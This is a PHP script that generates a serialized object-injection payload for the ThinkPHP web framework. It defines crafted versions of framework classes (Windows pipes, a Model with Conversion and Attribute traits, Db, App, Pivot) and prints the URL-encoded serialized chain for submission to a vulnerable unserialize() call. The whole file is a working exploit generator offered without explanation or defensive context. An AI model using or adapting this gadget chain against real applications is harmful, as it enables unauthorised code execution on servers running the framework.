<?php
namespace think\process\pipes{
    class Windows{
        public function __construct($s){
            $this->files = array($s);
        }
    }

}

namespace think\model\concern{
    trait Conversion{
        protected $append = array("key" => array('name' => 'name_value'));
    }

    trait Attribute{
        private $data = []; 
        function __construct(){
            $this->data = array("key" => new \think\Db()); //key 与上面$append那个key保持相同
        }
    }
}

namespace think{
    abstract class Model{
        use model\concern\Conversion;
        use model\concern\Attribute;
    }

    class App{
        protected $runtimePath;
        public function __construct(string $rootPath = ''){
            $this->rootPath = $rootPath;
            $this->runtimePath = "/tmp/test/test";
            $this->route = new \think\route\RuleName();
        }
    }

    class Db{
        protected $connection;
        protected $config = ['query' => '\think\Url'];
        function __construct(){
            $this->connection = new App();
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{

    }

}

namespace{
    require __DIR__ . '/vendor/autoload.php';
    $string = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($string);
    echo urlencode(serialize($payload));
}